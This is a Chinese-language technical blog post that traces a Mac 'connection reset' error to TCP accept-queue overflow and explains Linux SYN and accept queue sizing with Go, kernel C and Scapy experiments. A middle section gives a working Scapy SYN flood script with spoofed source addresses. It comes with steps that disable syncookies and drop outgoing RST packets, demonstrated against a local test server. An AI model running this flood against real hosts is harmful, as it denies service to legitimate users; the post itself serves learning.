---
title: 从一次 Connection Reset 说起，TCP 半连接队列与全连接队列
cover: http://asset.cjting.cn/FtEkcDD5AJAaZ3KPOABUwLrt_YPS.jpg
date: 2019-08-28T15:55:08+08:00
tags: ["linux", "network", "tcp"]
---
之前用 Go 编写过一个简单的服务器和客户端，用来测试 Go 的 HTTP 性能，无意中发现了一个奇怪的问题。

在我的 Mac 上客户端程序会非常稳定地遇到 *Connection Reset* 的错误，让人一头雾水。

<!--more-->

## 奇怪的 Connection Reset

服务器代码如下：

```go
package main

import (
  "log"
  "net/http"
)

var content = []byte(`hello world`)

func main() {
  http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    w.Write(content)
  })

  log.Fatal(http.ListenAndServe(":7777", nil))
}
```

客户端代码如下：

```go
package main

import (
  "fmt"
  "io"
  "io/ioutil"
  "net/http"
  "os"
  "strconv"
  "sync"
  "time"
)

var httpClient *http.Client

func main() {
  n := 1000
  if len(os.Args) > 1 {
    if x, err := strconv.Atoi(os.Args[1]); err == nil {
      n = x
    }
  }

  httpClient = &http.Client{
    Transport: &http.Transport{
      MaxIdleConnsPerHost: 2 * n,
      MaxIdleConns:        2 * n,
    },
    Timeout: 30 * time.Second,
  }

  var wg sync.WaitGroup

  for i := 0; i < n; i++ {
    wg.Add(1)
    go func() {
      do()
      wg.Done()
    }()
  }

  wg.Wait()
}

func do() {
  const url = "http://127.0.0.1:7777"
  resp, err := httpClient.Get(url)
  if err != nil {
    fmt.Printf("error: %v\n", err)
    return
  }
  io.Copy(ioutil.Discard, resp.Body)
  resp.Body.Close()
}
```

都是非常基础的代码，启动多个 Goroutine 并发请求一个只会返回 "Hello World" 的 Server 而已。

在我的 Mac 上运行的时候，会遇到如下错误：

```
error: Get http://127.0.0.1:7777: read tcp 127.0.0.1:53868->127.0.0.1:7777: read: connection reset by peer
```

非常奇怪的 *connection reset by peer* ，看起来应该是 Server 发送了一个 TCP 的 RST 包。

验证一下：

```bash
sudo tcpdump -nn -i lo0 src port 7777 | tee output.txt
```

里面有如下记录，说明我们的分析是对的。

```text
20:04:15.985768 IP 127.0.0.1.7777 > 127.0.0.1.49278: Flags [R], seq 2946808821, win 0, length 0
```

问题是，为什么？

## 半连接队列（SYN Queue）和全连接队列（Accept Queue）

我们把同样的代码放在 Linux 上运行一下试试，这一次，很正常，没有报错，说明这是一个系统级别的问题。

有一个很重要的点就是：**Mac 是基于 BSD 的，和 Linux 在很多地方是有不同的**。所以，在 Mac 上测试，没问题自然好，有问题第一反应应该是去 Linux 上测试，毕竟 Linux 才是生产机器。

先透露一下结论，上面这个问题根本原因在于：**全连接队列满了**。

我们首先来复习一下 TCP 三次握手，下面是 TCP 的状态变化图。

![](http://asset.cjting.cn/FuLfMxUTfLJeZgkFQuJvez1oeAAI.png)

TCP 通信不管上层怎么封装，最下面用的始终是 Socket 的一套接口。

基本过程是，Server 调用 `listen` 监听端口，客户端使用 `connect` 发起连接，然后 Server 使用 `accept` 获取已经到达 `ESTABLISHED` 状态的连接，然后进行读写。

从数据包来看：

1. Client: 发送 SYN，连接状态进入 `SYN_SENT`
2. Server: 收到 SYN, 创建连接状态为 `SYN_RCVD/SYN_RECV` 的 Socket，响应 SYN/ACK
3. Client: 收到 SYN/ACK，连接状态从 `SYN_SENT` 变为 `ESTABLISHED`，响应 ACK
4. Server: 收到 ACK，连接状态变为 `ESTABLISHED`

此时，双方的 Socket 都已经进入了 `ESTABLISHED` 状态，接下来就可以开始交换数据了。

从上面的过程中我们可以看出，Server 需要两个队列，分别存储 `SYN_RCVD` 状态的连接和 `ESTABLISHED` 状态的连接，这就是半连接队列和全连接队列。

## somaxconn & tcp_max_syn_backlog

既然是队列，就肯定有一个长度限制，就肯定存在溢出的问题。

我们首先来看长度限制，之后所有的讨论系统环境都是 CentOS 7。

全连接队列的大小比较简单，为 `min(backlog, somaxconn)`。其中 `backlog` 为调用 `listen` 函数时传递的参数，而 `somaxconn` 是一个系统参数，位置为 `/proc/sys/net/core/somaxconn`，默认值为 128。

半连接队列就是一个比较复杂的事情了，Google 了很久，大多含糊其辞，说不清楚，最后发现这篇 [Linux 诡异的半连接队列长度] 博客，写的很好。

当然，最好的方法永远是去读源码，但是网络栈太复杂，看相关的分析文章再结合源码效率会高很多，直接去读容易怀疑人生。

总体来说，半连接队列的长度由以下过程确定：

```c
backlog = min(somaxconn, backlog)
nr_table_entries = backlog
nr_table_entries = min(backlog, sysctl_max_syn_backlog)
nr_table_entries = max(nr_table_entries, 8)
// roundup_pow_of_two: 将参数向上取整到最小的 2^n 
// 注意这里存在一个 +1
nr_table_entries = roundup_pow_of_two(nr_table_entries + 1)
max_qlen_log = max(3, log2(nr_table_entries))
max_queue_length = 2^max_qlen_log
```

有一点绕，不过运算都很简单，半连接队列的长度实际上由三个参数决定：

- `listen` 时传入的 backlog
- `/proc/sys/net/ipv4/tcp_max_syn_backlog`，默认为 1024
- `/proc/sys/net/core/somaxconn`，默认为 128

我们假设 `listen` 传入的 backlog = 511，其他配置都是默认值，我们来计算一下半连接队列的具体长度。

```
backlog = min(128, 511) = 128
nr_table_entries = 128
nr_table_entries = min(128, 1024) = 128
nr_table_entries = max(128, 8) = 128
nr_table_entries = roundup_pow_of_two(129) = 256
max_qlen_log = max(3, 8) = 8
max_queue_length = 2^8 = 256
```

最后算出，半连接队列的长度为 256。

如果理解了半连接队列的长度决定机制，我们就可以理解为什么 [Nginx], [Redis] 都把自己的 listen backlog 参数设置为 `511` 了，因为内核计算过程中有一个奇怪的 +1 操作。

现在队列的长度已经确定了，那么队列如果满了的话会怎么样呢？

先来看半连接队列，这里就涉及到一个著名的攻击，SYN Flood 攻击。

## 半连接队列溢出 & SYN Flood

SYN Flood 的思路很简单，发送大量的 SYN 数据包给 Server，然后不回应 Server 响应的 SYN/ACK，这样，Server 端就会存在大量处于 `SYN_RECV` 状态的连接，这样的连接会持续填充半连接队列，最终导致半连接队列溢出。

当半连接队列溢出时，Server 收到了新的发起连接的 SYN：

- 如果不开启 `net.ipv4.tcp_syncookies`：直接丢弃这个 SYN
- 如果开启 `net.ipv4.tcp_syncookies`：
  + 如果全连接队列满了，并且 `qlen_young` 的值大于 1：丢弃这个 SYN
  + 否则，生成 syncookie 并返回 SYN/ACK 包

`qlen_young` 表示目前半连接队列中，没有进行 SYN/ACK 包重传的连接数量。

这里涉及到一个 `net.ipv4.tcp_syncookies` 配置项，这是内核用于抵御 SYN Flood 攻击的一种方式，它的核心思想在于：攻击者对于我们返回的 SYN/ACK 包是不会回复的，而正常用户会回复一个 ACK 包。

通过生成一个 Cookie 携带在我们返回的 SYN/ACK 包中，之后我们收到了 ACK 包，我们可以验证 Cookie 是否正确，如果正确，则允许建立连接。详细的过比较复杂，这里不再讨论了。

当 `net.ipv4.syncookies` 开启的时候，即便半连接队列已经满了，正常用户依旧可以和服务器进行通信。

当然，抵御 SYN Flood 攻击还有一些别的参数可以调整，不再一一说明了，网络栈十分复杂，感兴趣的朋友可以自己深入了解。

如果我们关闭 `net.ipv4.tcp_syncookies` 的话，当收到 SYN Flood 攻击时，系统会直接丢弃新的 SYN 包，也就是正常客户端将无法和服务器通信。

现在我们来动手实现一下 SYN Flood 攻击，首先安装 [Scapy] `pip install scapy`。

关闭 `net.ipv4.tcp_syncookies` 选项 `sysctl net.ipv4.tcp_syncookies=0`。

启动一个 [simple-tcp-server] 来监听 8877 端口，`listen` 的 `backlog` 参数为 7, `somaxconn` 为默认值 128，`tcp_max_syn_backlog` 为默认值 1024，此时半连接队列的长度为 16。

启动 `tcpdump` 监听 8877 端口相关的所有数据包 `tcpdump -tn -i lo port 8877`。

启动 `scapy` 命令行工具，我们先来发送一个 SYN 包看看。

```python
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
send(ip/tcp)
```

我们会发现，tcpdump 显示收到一个 SYN 包，但是没有对应的 SYN/ACK 回复？？？

```text
IP 127.0.0.1.ftp-data > 127.0.0.1.8877: Flags [S], seq 0, win 8192, length 0
```

我们用 nc 试一下 `nc -4 localhost 8877`，三次握手，一切正常。

```text
IP 127.0.0.1.57950 > 127.0.0.1.8877: Flags [S], seq 1788626632, win 43690, options [mss 65495,sackOK,TS val 162260912 ecr 0,nop,wscale 7], length 0
IP 127.0.0.1.8877 > 127.0.0.1.57950: Flags [S.], seq 2522189106, ack 1788626633, win 43690, options [mss 65495,sackOK,TS val 162260912 ecr 162260912,nop,wscale 7], length 0
IP 127.0.0.1.57950 > 127.0.0.1.8877: Flags [.], ack 1, win 342, options [nop,nop,TS val 162260912 ecr 162260912], length 0
```

Flags `[S.]` 中的 `.` 表示 ACK，很奇怪为什么不用 A，我猜应该又是一个“历史原因”，顺带附一下 Flags 的完整列表。

- `S`: SYN
- `F`: FIN
- `P`: PUSH
- `R`: RST
- `U`: URG
- `W`: ECN CWR
- `E`: ECN Echo
- `.`: ACK

究竟发生了什么，为什么使用 Scapy 发送的 SYN 包没有 SYN/ACK 回复？？？

这个问题困扰了我很久，一直没有找到答案，各种 Google 都没有相关信息，毫无头绪，深深地感受到了自己的无知😭。

后来仔细一想，既然 nc 可以，Scapy 不行，说明是 Scapy 的设置问题，把 Scapy 的文档从头到尾一字不落地看一遍，应该会有收获。

果然，在 FAQ 中，提到了这个 [问题](https://scapy.readthedocs.io/en/latest/troubleshooting.html#faq)。找到答案的那一刻，我差点热泪盈眶。

修改很简单，我们将 L3socket 从 PacketScoket 改为 RawSocket 就行了。再发送 SYN 包看看，这一次，内核回复了 SYN/ACK，但是，又来了一个问题，内核紧跟着又回复了一个 RST。

```python
conf.L3socket=L3RawSocket
send(ip/tcp)
```

```text
IP 127.0.0.1.ftp-data > 127.0.0.1.8877: Flags [S], seq 0, win 8192, length 0
IP 127.0.0.1.8877 > 127.0.0.1.ftp-data: Flags [S.], seq 2150811556, ack 1, win 43690, options [mss 65495], length 0
IP 127.0.0.1.ftp-data > 127.0.0.1.8877: Flags [R], seq 1, win 0, length 0
```

前进的道路总是崎岖的，这次又是为什么？？？

这次问题比较好回答了，Scapy 运行在用户空间，SYN/ACK 这个包内核会先收到。因为我们用的是 RawSocket，内核不知道我们在进行三次握手，内核突然收到了一个 SYN/ACK 包，同时这个包对应的端口没有相关的 Socket，那么内核会认为这是一个无效的数据包，返回 RST 断开连接。正常情况下，三次握手都是由内核完成，内核知道我们在握手，此时内核并不知道。

因为我们要测试 SYN Flood，这个 RST 包会使得 Server 断开连接，将连接从半连接队列中清除，使得我们的攻击无效。

解决这个问题的方法有两个。第一，我们不用 Loopback Network Interface，换一个，比如 en0，IP 地址是 192.168.10.2。我们构造数据包发给 en0，src IP 随便填写，比如 192.168.100.2，因为返回的 SYN/ACK 不会由我们自己的系统接收，自然也不存在内核发送 RST 的问题。

第二，我们继续使用 Loopback，但是我们使用 iptables 将 RST 包直接丢弃，这里我们选择使用这个方法。

CentOS 7 默认使用的是 firewalld 而不是 iptables，我们需要手动安装。

```bash
$ systemctl stop firewalld
$ yum install -y iptables-services
$ systemctl start iptables
# 添加规则，丢弃所有的 RST 包
$ iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

现在终于可以编写我们的攻击脚本了😈，很简单，循环发送 SYN 包即可。

```python
from time import sleep
from random import randint
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
def attack():
  while True:
    ip.src=f"127.0.0.{randint(0, 255)}"
    send(ip/tcp)
    sleep(0.01)

attack() # 发送大量的 SYN 包给目标地址
```

启动 `attack` 以后，此时我们试着用 `telnet localhost 8877` 去连接 8877 端口，会发现无法连接，说明攻击奏效了，因为半连接队列满了，Server 直接丢弃了 SYN 包，新的客户端无法和 Server 建立通讯。

查看 tcpdump 的输出，我们会发现全部都是 SYN/ACK 包，因为 Server 没有收到客户端的 ACK，所以会超时重发 SYN/ACK 给客户端。

![](http://asset.cjting.cn/FnRuxggtfoszNF6p6Ax1W34L7IYM.png)

使用 `netstat` 获取 Socket 状态，会看到 16 个处于 `SYN_RECV` 的 Socket。

![](http://asset.cjting.cn/FhTwQcNe0Uuxex-M6gM2S_obva8S.png)

## 全连接队列溢出

如果全连接队满了又会怎么样？应用程序调用 `accept` 的速度太慢，或者请求太多，都会导致这个情况。

当系统收到三次握手中第三次的 ACK 包，正常情况下应该是从半连接队列中取出连接，更改状态，放入全连接队列中。此时如果全连接队列满了的话：

- 如果设置了 `net.ipv4.tcp_abort_on_overflow`，那么直接回复 RST，同时，对应的连接直接从半连接队列中删除
- 否则，直接忽略 ACK，然后 TCP 的超时机制会起作用，一定时间以后，Server 会重新发送 SYN/ACK，因为在 Server 看来，它没有收到 ACK

我们来测试一下，首先，关闭 `net.ipv4.tcp_abort_on_overflow`，启动我们的 [simple-tcp-server]，`listen` 的 `backlog` 参数是 1，`somaxconn` 为 128，因此，全连接队列的长度为 1。

使用 Scapy 定义 `connect` 函数，函数内部我们手动实现了三次握手。

```python
ip=IP(dst="127.0.0.1")
tcp=TCP(dport=8877, flags="S")
idx = 1

def connect():
  global idx
  ip.src = f"127.0.0.{ idx }"
  synack = sr1(ip/tcp)
  ack = TCP(sport=synack.dport, dport=synack.sport, flags="A", seq=100, ack=synack.seq + 1)
  send(ip/ack)
  idx += 1
```

因为我们的 Server 从不 accept，所以，每次发起连接后，全连接队列就会添加一项。

使用 `netstat -tn | rg 8877` 查看 Socket 状态，同时使用 `tcpdump -tn -i lo port 8877` 抓包，然后我们手动触发 `connect` 函数。

第一次，多了一条 `ESTABLISHED` 的连接，一切正常。

第二次，又多了一条 `ESTABLISHED` 的连接，这好像不太对了？

第三次，多了一条 `SYN_RECV` 的连接，可以看到 Server 在不停的重发 SYN/ACK 包，对上了。

再之后，不管怎么发起连接，都只有两个 `ESTABLISHED` 状态的连接，剩下的都是 `SYN_RECV`。

问题来了，为什么是两个？全连接队列的长度是 1，应该只有 1 个才对。

不停地修改 listen 参数测试会发现，`ESTABLISHED` 连接的数量始终是全连接队列长度 + 1，我们可以大胆猜测，内核判断的时候，用的是 `>` 而不是 `>=`。

猜想归猜想，我更想验证一下，验证的方式只能是一头扎进 Linux 浩瀚的源码海洋里了。我运气很好，找到了检查全连接队列是否溢出的函数叫做 `sk_acceptq_is_full`，它的定义如下，这是 [在线版本](https://elixir.bootlin.com/linux/v3.5/source/include/net/sock.h#L669)。

```c
static inline bool sk_acceptq_is_full(const struct sock *sk)
{
  return sk->sk_ack_backlog > sk->sk_max_ack_backlog;
}
```

`sk->sk_ack_backlog` 是当前的全连接队列长度，`sk->sk_max_ack_backlog` 是配置的全连接队列最大长度，猜想验证了。

这里顺手提一下 `ss` 这个工具，一个现代化的用于取代 `netstat` 的工具，使用它，我们可以看到全连接队列的长度。

![](http://asset.cjting.cn/FqGFoNM8OPnt1J6xBfFN4k9pzDsj.png)

对于监听中的 Socket，`Recv-Q` 表示全连接队列当前的长度，`Send-Q` 表示全连接队列配置的长度。可以看到，对于 8877 端口，一个是 2，一个是 1。

我们可以通过 `netstat -s | rg -i listen` 来得知因为全连接队列溢出导致的连接丢弃数量是多少。

```bash
$ netstat -s | rg -i listen
20 times the listen queue of a socket overflowed
2286 SYNs to LISTEN sockets dropped
```

目前在我的机器上一共是 20 次。每次运行我们自己的 `connect` 函数，这个数字就会加一。

开启 `net.ipv4.tcp_abort_on_overflow` 以后，系统会直接发送 RST 而不是忽略 ACK，这里我们要注意一下修改防火墙的规则。

```bash
$ iptables -F OUTPUT # 清空所有规则
# 只阻止目标端口为 8877 的 RST 包
$ iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport 8877 -j DROP
```

使用 `connect` 函数我们会发现，Server 会返回一个 RST 包，同时也不存在 `SYN_RECV` 状态的连接。

![](http://asset.cjting.cn/FvB_BwUp1vO5BImwmJD5EJN6ymMX.png)

## 回到 Mac

最后，我们回到最开始的那个问题。

为什么那段 Go 程序在 Mac 上报错了？我们可以猜测一下，应该是 Mac 的 `somaxconn` 参数比较小，导致全连接队列溢出，导致内核给新的连接发送了 RST 包。

Mac 也有 sysctl 工具，但是如果我们直接把 Linux 的指令 `sysctl net.core.somaxconn` 搬上去会发现报错找不到配置项。

我们来 `man` 一下 sysctl，文档里面没有提及 `somaxconn`，我们只能进一步再想想办法。

文档中提到，sysctl 有一个相关的 C 头文件是 `<sys/sysctl.h>`，我们来打开这个头文件看看里面有什么。

问题又来了，这个头文件在哪儿？在 Linux 上，我们可以猜一猜，比如 `/usr/include` 之类的，但是其实没有必要。编译器一定清楚头文件的路径，我们直接问编译器即可。

我一般用如下的方式获取头文件的路径，写一小段程序，让编译器打印一个完整的头文件列表出来，我们要的路径自然会在这个列表当中。

```bash
echo "#include <sys/sysctl.h>" | gcc -M -xc - | rg sysctl
```

在我的 Mac 上，`<sys/sysctl.h>` 头文件位于 `/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk/usr/include/sys/sysctl.h`。

打开这个头文件，搜索 `somaxconn`，我们可以发现一个常量定义 `#define KIPC_SOMAXCONN`，再结合 sysctl 的 manual，我们可以知道，`somaxconn` 在 Mac 上的配置项名称是 `kern.ipc.somaxconn`。

调整这个参数到 1000 以后 `sysctl kern.ipc.somaxconn=1000`，再运行我们的程序，Problem Gone。

## 参考

- [How TCP backlog works in Linux](http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html)
- [源码分析 TCP 协议中的 SYN queue 和 accept queue 处理](https://my.oschina.net/moooofly/blog/666048)

[Linux 诡异的半连接队列长度]: https://www.cnblogs.com/zengkefu/p/5606696.html
[Redis]: https://github.com/antirez/redis/blob/5.0.5/src/server.h#L87
[Nginx]: https://github.com/nginx/nginx/blob/release-1.17.3/src/os/unix/ngx_linux_config.h#L107
[simple-tcp-server]: https://gist.github.com/cj1128/e6620df2ea2e650164d7513b05c88c8c
[Scapy]: https://scapy.net/
